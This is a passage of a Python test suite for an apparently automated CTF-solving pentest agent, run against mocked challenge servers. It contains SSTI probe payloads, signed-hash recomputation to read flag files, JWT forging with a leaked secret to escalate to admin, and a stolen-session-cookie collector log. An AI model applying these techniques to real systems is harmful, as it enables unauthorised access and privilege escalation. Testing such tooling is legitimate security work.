    e_l = controller.verbal_reflection(state_l, "flag{llm_guess}", "llm_driven_exploration")
    assert "LLM" in e_l["reflection"]
    assert len(e_l["reflection"]) <= 256

    # SSTI 路径 → "SSTI"
    state_s = CTFState(target="http://ctf.local", goal="拿到flag")
    e_s = controller.verbal_reflection(state_s, "flag{49}", "ssti_probe")
    assert "SSTI" in e_s["reflection"]
    assert len(e_s["reflection"]) <= 256

    # source-only 路径 → "source-only"相关文本
    state_so = CTFState(target="http://ctf.local", goal="拿到flag")
    e_so = controller.verbal_reflection(state_so, "flag{src}", "source-only")
    assert "source" in e_so["reflection"].lower() or "证据" in e_so["reflection"]
    assert len(e_so["reflection"]) <= 256


@pytest.mark.asyncio
async def test_p7_rec_03_strategy_memory_write_reflection_retrievable_by_query():
    """P7-REC-03: write_reflection() 写入的条目可通过 query() 检索。"""
    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        store = StrategyMemoryStore(path=Path(tmp) / "test_reflections.json")
        fp = ChallengeFingerprint(tech_stack=["web"])

        entry_id = await store.write_reflection(
            wrong_flag="flag{wrong_guess}",
            evidence_source="source-only",
            reflection_text="①该flag来自source-only证据。②切换到其他链路。③关联假设:unknown。",
            challenge_url="http://ctf.local",
            fingerprint=fp,
        )

        assert entry_id.startswith("refl_")

        # 用相同 fingerprint 查询 → 应能匹配到刚写入的条目
        query_fp = ChallengeFingerprint(tech_stack=["web"])
        matches = await store.query(query_fp, top_k=5)

        assert len(matches) >= 1
        found_ids = [entry.id for entry, _ in matches]
        assert entry_id in found_ids

        # 验证反思文本存入了 learned_rules，错误 flag 存入了 red_herrings_encountered
        matched = next(e for e, _ in matches if e.id == entry_id)
        assert any("source-only" in rule or "flag来自" in rule for rule in matched.learned_rules)
        assert "flag{wrong_guess}" in (matched.red_herrings_encountered or [])


# ─────────────────────────────────────────────────────────────────────────────
# Phase 7 §1 — HypothesisEngine abort_condition + value_score
# P7-HYP-01 to P7-HYP-03
# ─────────────────────────────────────────────────────────────────────────────


def test_p7_hyp_01_hypothesis_has_abort_condition_and_value_score_fields():
    """P7-HYP-01: Hypothesis dataclass 包含 abort_condition / fallback_plan / value_score 字段。"""
    from pentestagent.agents.pa_agent.ctf_state import Hypothesis

    hyp = Hypothesis(
        id="test_hyp",
        kind="ssti_via_render_parameter",
        description="test",
        confidence=0.6,
        abort_condition="uniform_failure_surface × 2",
        fallback_plan="switch to llm_driven_exploration",
        value_score=0.7,
    )
    assert hyp.abort_condition == "uniform_failure_surface × 2"
    assert hyp.fallback_plan == "switch to llm_driven_exploration"
    assert hyp.value_score == 0.7

    # 默认值
    default_hyp = Hypothesis(id="h2", kind="generic", description="d", confidence=0.5)
    assert default_hyp.abort_condition is None
    assert default_hyp.fallback_plan is None
    assert default_hyp.value_score == 0.5


def test_p7_hyp_02_update_after_chain_aborts_hypothesis_on_condition_match():
    """P7-HYP-02: update_after_chain() 在 counter_evidence 满足 abort_condition 时标记 exhausted。"""
    from pentestagent.agents.pa_agent.hypothesis_engine import HypothesisEngine
    from pentestagent.agents.pa_agent.ctf_state import Hypothesis

    engine = HypothesisEngine()
    state = CTFState(target="http://ctf.local", goal="拿到flag")

    hyp = Hypothesis(
        id="ssti_via_render_parameter",
        kind="ssti_via_render_parameter",
        description="test",
        confidence=0.6,
        abort_condition="uniform_failure_surface × 2",
    )
    # 注入 2 次 uniform_failure_surface counter_evidence
    hyp.counter_evidence.extend(["uniform_failure_surface", "uniform_failure_surface"])
    state.hypotheses = [hyp]

    aborted = engine.update_after_chain(state, observed_signal="uniform_failure_surface")

    assert len(aborted) == 1
    assert aborted[0].kind == "ssti_via_render_parameter"
    assert hyp.status == "exhausted"
    assert hyp.confidence == 0.0


def test_p7_hyp_03_update_after_chain_does_not_abort_below_threshold():
    """P7-HYP-03: counter_evidence 不足阈值时 update_after_chain() 不改变假设状态。"""
    from pentestagent.agents.pa_agent.hypothesis_engine import HypothesisEngine
    from pentestagent.agents.pa_agent.ctf_state import Hypothesis

    engine = HypothesisEngine()
    state = CTFState(target="http://ctf.local", goal="拿到flag")

    # 只有 1 次 uniform_failure_surface，条件是 × 2
    hyp = Hypothesis(
        id="ssti_via_render_parameter",
        kind="ssti_via_render_parameter",
        description="test",
        confidence=0.6,
        abort_condition="uniform_failure_surface × 2",
    )
    hyp.counter_evidence.append("uniform_failure_surface")
    state.hypotheses = [hyp]

    aborted = engine.update_after_chain(state, observed_signal="partial_failure")

    assert len(aborted) == 0
    assert hyp.status == "active"  # 未改变

    # × 1 阈值：1 次就够，应中止
    hyp2 = Hypothesis(
        id="hash_guarded_file_read",
        kind="hash_guarded_file_read",
        description="test",
        confidence=0.5,
        abort_condition="uniform_failure_surface × 1",
    )
    hyp2.counter_evidence.append("uniform_failure_surface")
    state.hypotheses = [hyp2]

    aborted2 = engine.update_after_chain(state, observed_signal="blocked")
    assert len(aborted2) == 1
    assert hyp2.status == "exhausted"


# ─────────────────────────────────────────────────────────────────────────────
# Phase 7 §3 — StrategyMemory 失败轨迹负反馈
# P7-MEM-01 to P7-MEM-03
# ─────────────────────────────────────────────────────────────────────────────


def test_p7_mem_01_strategy_memory_entry_has_failed_payloads_and_failure_reasons_fields():
    """P7-MEM-01: StrategyMemoryEntry 包含 failed_payloads / failure_reasons 字段，默认为空列表。"""
    entry = StrategyMemoryEntry(
        id="test_entry",
        fingerprint=ChallengeFingerprint(tech_stack=["web"]),
    )
    assert hasattr(entry, "failed_payloads")
    assert hasattr(entry, "failure_reasons")
    assert entry.failed_payloads == []
    assert entry.failure_reasons == []

    # 可以在构造时赋值
    entry2 = StrategyMemoryEntry(
        id="test_entry2",
        fingerprint=ChallengeFingerprint(tech_stack=["web"]),
        failed_payloads=["{{7*7}}", "${7*7}"],
        failure_reasons=["uniform ORZ response", "WAF 403"],
    )
    assert "{{7*7}}" in entry2.failed_payloads
    assert "WAF 403" in entry2.failure_reasons


@pytest.mark.asyncio
async def test_p7_mem_02_record_failure_appends_payload_and_reason():
    """P7-MEM-02: record_failure() 向已有条目追加 failed_payloads 和 failure_reasons。"""
    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        store = StrategyMemoryStore(path=Path(tmp) / "test_mem.json")
        fp = ChallengeFingerprint(tech_stack=["web"])

        # 先写入一个条目
        entry_id = await store.write_reflection(
            wrong_flag="flag{bad}",
            evidence_source="ssti_probe",
            reflection_text="test reflection",
            fingerprint=fp,
        )

        # 追加失败记录
        updated = await store.record_failure(
            entry_id,
            payload="{{7*7}}",
            reason="uniform ORZ response",
        )

        assert updated is not None
        assert "{{7*7}}" in updated.failed_payloads
        assert "uniform ORZ response" in updated.failure_reasons

        # 重复追加同一条记录不应产生重复
        updated2 = await store.record_failure(
            entry_id,
            payload="{{7*7}}",
            reason="uniform ORZ response",
        )
        assert updated2 is not None
        assert updated2.failed_payloads.count("{{7*7}}") == 1
        assert updated2.failure_reasons.count("uniform ORZ response") == 1


@pytest.mark.asyncio
async def test_p7_mem_03_record_failure_returns_none_for_missing_entry():
    """P7-MEM-03: record_failure() 在 entry_id 不存在时返回 None，且不修改文件。"""
    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        store = StrategyMemoryStore(path=Path(tmp) / "empty.json")

        result = await store.record_failure(
            "nonexistent_id",
            payload="{{7*7}}",
            reason="WAF blocked",
        )
        assert result is None

        # 对空 entry_id 也应返回 None
        result2 = await store.record_failure("", payload="x", reason="y")
        assert result2 is None


# ─────────────────────────────────────────────────────────────────────────────
# Phase 7 §8 — FlagProof 审计字段
# P7-PROOF-01 to P7-PROOF-02
# ─────────────────────────────────────────────────────────────────────────────


def test_p7_proof_01_flag_proof_has_reproduction_steps_and_related_observations():
    """P7-PROOF-01: FlagProof 包含 reproduction_steps 和 related_observations，默认为空列表。"""
    from pentestagent.agents.pa_agent.ctf_state import FlagProof

    proof = FlagProof(
        proof_type="runtime_http",
        evidence_source="ssti_exploit",
        evidence_url="http://ctf.local/render?name=x",
        evidence_snippet="flag{ssti_ok}",
        replayable=True,
        submit_confidence=0.95,
        source_trust="runtime",
    )
    assert hasattr(proof, "reproduction_steps")
    assert hasattr(proof, "related_observations")
    assert proof.reproduction_steps == []
    assert proof.related_observations == []


def test_p7_proof_02_flag_proof_reproduction_steps_and_observations_settable():
    """P7-PROOF-02: reproduction_steps 和 related_observations 在构造时可赋值。"""
    from pentestagent.agents.pa_agent.ctf_state import FlagProof

    proof = FlagProof(
        proof_type="runtime_http",
        evidence_source="hash_reconstruction",
        evidence_url="http://ctf.local/file",
        evidence_snippet="flag{hash_ok}",
        replayable=True,
        submit_confidence=0.9,
        source_trust="runtime",
        reproduction_steps=[
            "1. GET /hints.txt → 获取 filename",
            "2. 构造 md5(secret+md5(filename))",
            "3. GET /file?filename=flag.txt&filehash=<hash>",
        ],
        related_observations=["obs_hint_file_found", "obs_filehash_pattern"],
    )
    assert len(proof.reproduction_steps) == 3
    assert "2. 构造 md5" in proof.reproduction_steps[1]
    assert "obs_hint_file_found" in proof.related_observations


# ─────────────────────────────────────────────────────────────────────────────
# Phase 7 §7 — hash_guarded 策略泛化 (SignSaboteur pipeline)
# P7-HASH-01 to P7-HASH-04
# ─────────────────────────────────────────────────────────────────────────────


def test_p7_hash_01_discover_hash_params_from_url():
    """P7-HASH-01: _discover_hash_params 从 URL 查询字符串中找到 filename+filehash 参数。"""
    from pentestagent.agents.pa_agent.ctf_dispatcher import _discover_hash_params

    # 标准 Tornado URL 模式
    url = "http://ctf.local/file?filename=flag.txt&filehash=abc123"
    result = _discover_hash_params(url)
    assert result.get("filename") == "flag.txt"
    assert result.get("filehash") == "abc123"

    # 只有 query string 部分
    result2 = _discover_hash_params("filename=hints.txt&filehash=deadbeef")
    assert result2.get("filename") == "hints.txt"
    assert result2.get("filehash") == "deadbeef"

    # 无参数时返回空 dict
    result3 = _discover_hash_params("no hash params here")
    assert result3 == {}


def test_p7_hash_02_infer_hash_format_md5_and_sha256():
    """P7-HASH-02: _infer_hash_format 根据长度识别 md5（32 hex）和 sha256（64 hex）。"""
    from pentestagent.agents.pa_agent.ctf_dispatcher import _infer_hash_format

    # 32 hex chars → md5
    md5_hash = "d41d8cd98f00b204e9800998ecf8427e"
    assert _infer_hash_format(md5_hash) == "md5"

    # 64 hex chars → sha256
    sha256_hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    assert _infer_hash_format(sha256_hash) == "sha256"

    # 非 hex 内容 → unknown
    assert _infer_hash_format("not-a-hash") == "unknown"
    # 空值 → unknown
    assert _infer_hash_format("") == "unknown"
    # 非标准长度 → unknown
    assert _infer_hash_format("abcd1234") == "unknown"


def test_p7_hash_03_compute_signed_hash_md5_matches_tornado_pattern():
    """P7-HASH-03: _compute_signed_hash md5 路径重现 md5(secret+md5(filename))，key-guess 成功。"""
    import hashlib
    from pentestagent.agents.pa_agent.ctf_dispatcher import _compute_signed_hash

    secret = "my_tornado_secret"
    filename = "flag.txt"

    # 手动计算期望值
    inner = hashlib.md5(filename.encode()).hexdigest()
    expected = hashlib.md5((secret + inner).encode()).hexdigest()

    result = _compute_signed_hash(secret, filename, "md5")
    assert result == expected
    assert len(result) == 32  # md5 hex 长度

    # 不支持的格式返回 None
    assert _compute_signed_hash(secret, filename, "unknown") is None


def test_p7_hash_04_compute_signed_hash_sha256_path():
    """P7-HASH-04: _compute_signed_hash sha256 路径重现 sha256(secret+sha256(filename))。"""
    import hashlib
    from pentestagent.agents.pa_agent.ctf_dispatcher import _compute_signed_hash

    secret = "sha256_secret"
    filename = "secret.txt"

    inner = hashlib.sha256(filename.encode()).hexdigest()
    expected = hashlib.sha256((secret + inner).encode()).hexdigest()

    result = _compute_signed_hash(secret, filename, "sha256")
    assert result == expected
    assert len(result) == 64  # sha256 hex 长度
    assert _infer_hash_format_helper(result) == "sha256"


def test_p7_hash_05_infer_hash_format_supports_jwt_and_compute_hs256_hs512():
    from pentestagent.agents.pa_agent.ctf_dispatcher import (
        _compute_signed_hash,
        _infer_hash_format,
        _jwt_decode_verified,
    )

    hs256_token = _compute_signed_hash("jwt_secret", "flag.txt", "jwt")
    assert hs256_token is not None
    assert _infer_hash_format(hs256_token) == "jwt"
    decoded_256 = _jwt_decode_verified(hs256_token, "jwt_secret", ["HS256"])
    assert decoded_256["filename"] == "flag.txt"

    hs512_token = _compute_signed_hash("jwt_secret", "flag.txt", "jwt_hs512")
    assert hs512_token is not None
    decoded_512 = _jwt_decode_verified(hs512_token, "jwt_secret", ["HS512"])
    assert decoded_512["filename"] == "flag.txt"


def _infer_hash_format_helper(h: str) -> str:
    """Test helper: call _infer_hash_format directly."""
    from pentestagent.agents.pa_agent.ctf_dispatcher import _infer_hash_format
    return _infer_hash_format(h)


@pytest.mark.asyncio
async def test_p2_record_uniform_failure_surface_appends_strategy_memory_failure(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_uniform_failure.json")
    notes_module._notes.clear()

    memory_store = StrategyMemoryStore(tmp_path / "strategy_memory_uniform_failure.json")
    await memory_store.save(
        StrategyMemoryEntry(
            id="mem_seed",
            fingerprint=ChallengeFingerprint(tech_stack=["web"]),
            metadata=StrategyMemoryEntryMetadata(created_at=1e12, manual_status="active"),
        )
    )
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.StrategyMemoryStore",
        lambda: memory_store,
    )

    dispatcher = CTFTaskDispatcher(runtime=_DispatcherMissingReconDepsRuntime(), progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
    dispatcher._memory_match_ids = ["mem_seed"]

    await dispatcher._record_uniform_failure_surface(
        "uniform_orz",
        source="ssti_probe",
        metadata={
            "signature": "orz:200",
            "reason": "ssti probe returned uniform ORZ",
            "strategy_kind": "ssti_probe",
        },
    )

    updated = await memory_store.get_entry("mem_seed")
    assert updated is not None
    assert "orz:200" in updated.failed_payloads
    assert "ssti probe returned uniform ORZ" in updated.failure_reasons
    assert any(obs.kind == "uniform_failure_surface" for obs in dispatcher.state.observations)
    assert any(
        isinstance(item, dict) and item.get("type") == "strategy_memory_failure_recorded"
        for item in dispatcher.state.meta_reasonings
    )


@pytest.mark.asyncio
async def test_p2_observe_flag_hydrates_proof_reproduction_steps_and_related_observations(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_proof_hydration.json")
    notes_module._notes.clear()

    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherMissingReconDepsRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
    dispatcher.state.add_observation(
        "render_ssti_response",
        "49",
        source="ssti_probe",
        metadata={
            "strategy_kind": "ssti_probe",
            "payload": "{{7*7}}",
            "url": "http://ctf.local/error?msg=%7B%7B7*7%7D%7D",
        },
    )
    dispatcher.state.add_observation(
        "ssti_probe_hit",
        "{{7*7}}",
        source="ssti_probe",
        metadata={"strategy_kind": "ssti_probe"},
    )

    verification = await dispatcher._observe_flag(
        "flag{proof_hydrated}",
        "http://ctf.local",
        evidence_source="response_body",
        rationale="SSTI runtime flag",
        evidence_url="http://ctf.local/error?msg=%7B%7Bconfig%7D%7D",
        strategy_kind="ssti_probe",
    )

    assert verification.proof is not None
    assert verification.proof.reproduction_steps
    assert verification.proof.related_observations
    assert any("payload" in step or "提取 flag" in step for step in verification.proof.reproduction_steps)
    assert any("ssti_probe_hit" in item or "render_ssti_response" in item for item in verification.proof.related_observations)


class _JWTManipulationRuntime:
    def __init__(self, seed_token: str):
        self.environment = SimpleNamespace(available_tools=[])
        self.seed_token = seed_token
        self.requests: list[dict[str, object]] = []

    async def browser_action(self, action: str, **kwargs):
        if action == "diagnose":
            return {"available": False, "error": "no browser"}
        return {"error": "no browser"}

    async def proxy_action(self, action: str, **kwargs):
        headers = kwargs.get("headers", {}) or {}
        if action == "get" and not headers:
            return {
                "status_code": 200,
                "body": f"Authorization: Bearer {self.seed_token}",
                "headers": {"Authorization": f"Bearer {self.seed_token}"},
            }
        if action == "request":
            return {"status_code": 404, "body": ""}
        url = kwargs.get("url", "")
        self.requests.append({"action": action, "url": url, "headers": dict(headers)})
        auth = str(headers.get("Authorization") or "")
        cookie = str(headers.get("Cookie") or "")
        token = ""
        if auth.lower().startswith("bearer "):
            token = auth.split(" ", 1)[1].strip()
        elif "=" in cookie:
            token = cookie.split("=", 1)[1].strip()
        if token:
            from pentestagent.agents.pa_agent.ctf_dispatcher import _jwt_decode_verified

            try:
                payload = _jwt_decode_verified(
                    token,
                    "secret",
                    ["HS256", "HS512"],
                )
                if payload.get("role") == "admin" or payload.get("is_admin") is True:
                    return {"status_code": 200, "body": "flag{jwt_admin_ok}"}
            except Exception:
                pass
        return {"status_code": 403, "body": "forbidden"}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


@pytest.mark.asyncio
async def test_p3_jwt_manipulation_strategy_escalates_seed_token_to_runtime_flag(
    monkeypatch, tmp_path
):
    from pentestagent.agents.pa_agent.ctf_dispatcher import _jwt_encode

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_jwt_strategy.json")
    notes_module._notes.clear()

    seed_token = _jwt_encode({"role": "user", "uid": 2}, "secret", "HS256")
    runtime = _JWTManipulationRuntime(str(seed_token))
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="auto",
        hint="",
    )

    assert result.success is True
    assert result.flag == "flag{jwt_admin_ok}"
    assert "jwt" in result.chain_used
    assert any(
        obs.kind == "jwt_probe_response" and obs.source == "jwt_manipulation"
        for obs in dispatcher.state.observations
    )


@pytest.mark.asyncio
async def test_jwt_manipulation_strategy_uses_source_hint_secret_candidates(
    monkeypatch, tmp_path
):
    from pentestagent.agents.pa_agent.ctf_dispatcher import _jwt_encode

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_jwt_source_hint.json")
    notes_module._notes.clear()

    signing_secret = "ultra-signing-key"
    seed_token = _jwt_encode({"role": "user", "uid": 7}, signing_secret, "HS256")
    runtime = _JWTSourceHintSecretRuntime(str(seed_token), signing_secret)
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local/",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "settings.py: JWT_SECRET = 'ultra-signing-key'\nAuthorization: Bearer <token>\nrole=admin",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\jwt_demo\settings.py"},
    )

    outcome = await dispatcher._run_jwt_manipulation_strategy(
        "http://ctf.local/",
        {
            "content": f"Authorization: Bearer {seed_token}",
            "html": "",
            "headers": {"Authorization": f"Bearer {seed_token}"},
            "cookies": "",
        },
    )

    assert outcome.flag == "flag{jwt_source_hint_secret_ok}"
    assert any(
        str((request.get("headers") or {}).get("Authorization") or "").startswith("Bearer ")
        for request in runtime.requests
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


def test_extract_local_challenge_root_from_context_prefers_explicit_challenge_path(tmp_path) -> None:
    challenge_dir = tmp_path / "easy_login_context"
    challenge_dir.mkdir()
    (challenge_dir / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: easy_login-app\n", encoding="utf-8"
    )

    resolved = ctf_dispatcher._extract_local_challenge_root(
        "ignore stale note D:\\decoy\\fake\\path\\readme.txt",
        {"challengePath": str(challenge_dir), "artifactPaths": []},
    )

    assert resolved == challenge_dir


def test_extract_local_challenge_root_from_context_can_unpack_zip_artifact(tmp_path) -> None:
    import zipfile

    archive_dir = tmp_path / "archive_src" / "easy_login_context_zip"
    archive_dir.mkdir(parents=True)
    (archive_dir / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: easy_login-app\n", encoding="utf-8"
    )

    archive_path = tmp_path / "easy_login_context.zip"
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(archive_dir / "docker-compose.yml", arcname="easy_login/docker-compose.yml")

    resolved = ctf_dispatcher._extract_local_challenge_root(
        "",
        {"challengePath": None, "artifactPaths": [str(archive_path)]},
    )

    assert resolved is not None
    assert resolved.name == "easy_login"
    assert (resolved / "docker-compose.yml").exists()


def test_extract_local_challenge_root_from_context_prefers_explicit_challenge_path(tmp_path) -> None:
    challenge_dir = tmp_path / "easy_login_context"
    challenge_dir.mkdir()
    (challenge_dir / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: easy_login-app\n", encoding="utf-8"
    )

    resolved = ctf_dispatcher._extract_local_challenge_root(
        "ignore stale note D:\\decoy\\fake\\path\\readme.txt",
        {"challengePath": str(challenge_dir), "artifactPaths": []},
    )

    assert resolved == challenge_dir


def test_extract_local_challenge_root_from_context_can_unpack_zip_artifact(tmp_path) -> None:
    import zipfile

    archive_dir = tmp_path / "archive_src" / "easy_login_context_zip"
    archive_dir.mkdir(parents=True)
    (archive_dir / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: easy_login-app\n", encoding="utf-8"
    )

    archive_path = tmp_path / "easy_login_context.zip"
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(archive_dir / "docker-compose.yml", arcname="easy_login/docker-compose.yml")

    resolved = ctf_dispatcher._extract_local_challenge_root(
        "",
        {"challengePath": None, "artifactPaths": [str(archive_path)]},
    )

    assert resolved is not None
    assert resolved.name == "easy_login"
    assert (resolved / "docker-compose.yml").exists()


def test_extract_local_ctf_assets_from_hint_parses_structured_block() -> None:
    assets = ctf_dispatcher._extract_local_ctf_assets_from_hint(
        "focus on local artifacts\n\n[local_ctf_assets]\nchallengePath=D:\\webstudy\\CTF\\2026\\CTF比赛题\\easy_login\nartifactPaths=D:\\webstudy\\CTF\\2026\\CTF比赛题\\easy_login\\docker-compose.yml; D:\\webstudy\\CTF\\2026\\CTF比赛题\\easy_login\\README.md"
    )

    assert assets["challengePath"] == r"D:\webstudy\CTF\2026\CTF比赛题\easy_login"
    assert assets["artifactPaths"] == [
        r"D:\webstudy\CTF\2026\CTF比赛题\easy_login\docker-compose.yml",
        r"D:\webstudy\CTF\2026\CTF比赛题\easy_login\README.md",
    ]


def test_extract_local_challenge_root_from_hint_prefers_structured_challenge_path(tmp_path) -> None:
    challenge_dir = tmp_path / "easy_login"
    challenge_dir.mkdir()
    (challenge_dir / "docker-compose.yml").write_text("services:\n  app:\n    image: easy_login-app\n", encoding="utf-8")

    hint = (
        "ignore stale note D:\\decoy\\fake\\path\\readme.txt\n\n"
        f"[local_ctf_assets]\nchallengePath={challenge_dir}"
    )

    resolved = ctf_dispatcher._extract_local_challenge_root_from_hint(hint)

    assert resolved == challenge_dir


def test_extract_local_challenge_root_from_hint_can_use_structured_artifact_compose_file(tmp_path) -> None:
    challenge_dir = tmp_path / "easy_login_artifact_only"
    challenge_dir.mkdir()
    compose_file = challenge_dir / "docker-compose.yml"
    compose_file.write_text("services:\n  app:\n    image: easy_login-app\n", encoding="utf-8")

    hint = (
        "artifact-only local context\n\n"
        "[local_ctf_assets]\n"
        f"artifactPaths={compose_file}; {challenge_dir / 'README.md'}"
    )

    resolved = ctf_dispatcher._extract_local_challenge_root_from_hint(hint)

    assert resolved == challenge_dir


def test_extract_local_challenge_root_from_hint_can_unpack_local_zip_artifact(tmp_path) -> None:
    import zipfile

    archive_dir = tmp_path / "archive_src" / "easy_login_zip_only"
    archive_dir.mkdir(parents=True)
    (archive_dir / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: easy_login-app\n", encoding="utf-8"
    )
    (archive_dir / "README.md").write_text("# easy_login\n", encoding="utf-8")

    archive_path = tmp_path / "easy_login.zip"
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(archive_dir / "docker-compose.yml", arcname="easy_login/docker-compose.yml")
        zf.write(archive_dir / "README.md", arcname="easy_login/README.md")

    hint = (
        "zip-only local context\n\n"
        "[local_ctf_assets]\n"
        f"artifactPaths={archive_path}"
    )

    resolved = ctf_dispatcher._extract_local_challenge_root_from_hint(hint)

    assert resolved is not None
    assert resolved.name == "easy_login"
    assert (resolved / "docker-compose.yml").exists()


class _DirectFlagPageRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])

    async def browser_action(self, action: str, **kwargs):
        if action == "navigate":
            return {"url": "http://ctf.local/", "title": "flag-home"}
        if action == "get_content":
            return {
                "content": "welcome flag{ledger_verified_ok}",
                "html": "<html><body>flag{ledger_verified_ok}</body></html>",
            }
        if action == "get_forms":
            return {"forms": []}
        return {"error": f"unexpected action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _JWTSourceHintSecretRuntime:
    def __init__(self, seed_token: str, signing_secret: str):
        self.environment = SimpleNamespace(available_tools=[])
        self.seed_token = seed_token
        self.signing_secret = signing_secret
        self.requests: list[dict[str, object]] = []

    async def browser_action(self, action: str, **kwargs):
        return {"error": "no browser"}

    async def proxy_action(self, action: str, **kwargs):
        headers = kwargs.get("headers", {}) or {}
        url = kwargs.get("url", "")
        self.requests.append({"action": action, "url": url, "headers": dict(headers)})
        auth = str(headers.get("Authorization") or "")
        token = ""
        if auth.lower().startswith("bearer "):
            token = auth.split(" ", 1)[1].strip()
        if token:
            from pentestagent.agents.pa_agent.ctf_dispatcher import _jwt_decode_verified

            try:
                payload = _jwt_decode_verified(
                    token,
                    self.signing_secret,
                    ["HS256", "HS512"],
                )
                if payload.get("role") == "admin" or payload.get("is_admin") is True:
                    return {"status_code": 200, "body": "flag{jwt_source_hint_secret_ok}"}
            except Exception:
                pass
        return {"status_code": 403, "body": "forbidden"}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherSourceHintAwareBackupRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[str] = []

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        if action != "get":
            return {"status_code": 404, "body": ""}

        url = kwargs.get("url", "")
        self.requests.append(url)
        if url == "http://ctf.local/app.py.bak":
            return {
                "status_code": 200,
                "body": (
                    "from flask import Flask\n"
                    "app = Flask(__name__)\n"
                    "@app.route('/admin')\n"
                    "def admin():\n"
                    "    return 'ok'\n"
                ),
            }
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _HelperAuditRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=["terminal", "http_request"])
        self.commands: list[str] = []
        self.requests: list[tuple[str, dict[str, object]]] = []

    async def browser_action(self, action: str, **kwargs):
        return {"error": f"unexpected action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        self.requests.append((action, dict(kwargs)))
        url = str(kwargs.get("url") or "")
        method = str(kwargs.get("method") or "").upper()
        if action == "request" and method == "GET" and "/admin" in url:
            cookie = str((kwargs.get("headers") or {}).get("Cookie") or "")
            if "sid=helper-admin" in cookie:
                return {"status_code": 200, "body": "flag{helper_admin_ok}"}
            return {"status_code": 403, "body": "forbidden"}
        return {"status_code": 200, "body": "helper response"}

    async def execute_command(self, command: str, timeout: int = 180):
        self.commands.append(command)
        return SimpleNamespace(exit_code=0, stdout="command ok", stderr="")


class _ExploitAuditRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=["terminal", "http_request"])
        self.commands: list[str] = []
        self.requests: list[tuple[str, dict[str, object]]] = []

    async def browser_action(self, action: str, **kwargs):
        return {"error": f"unexpected action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        self.requests.append((action, dict(kwargs)))
        return {"status_code": 200, "body": "visit triggered", "final_url": str(kwargs.get("url") or "")}

    async def execute_command(self, command: str, timeout: int = 180):
        self.commands.append(command)
        lower = command.lower()
        if "cat /tmp/flaghunter_visit_collector.log" in lower or "type /tmp/flaghunter_visit_collector.log" in lower:
            return SimpleNamespace(success=True, exit_code=0, stdout="sid=loopback-admin", stderr="")
        if "docker ps --format" in lower:
            return SimpleNamespace(success=True, exit_code=0, stdout='easy_login_app|0.0.0.0:3000->3000/tcp\n', stderr="")
        return SimpleNamespace(success=True, exit_code=0, stdout="", stderr="")


@pytest.mark.asyncio
async def test_dispatcher_writes_session_ledger_events_for_verified_flag(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    from pentestagent.harness.session_ledger import SessionLedger

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_ledger_verified.json")
    notes_module._notes.clear()

    dispatcher = CTFTaskDispatcher(
        runtime=_DirectFlagPageRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
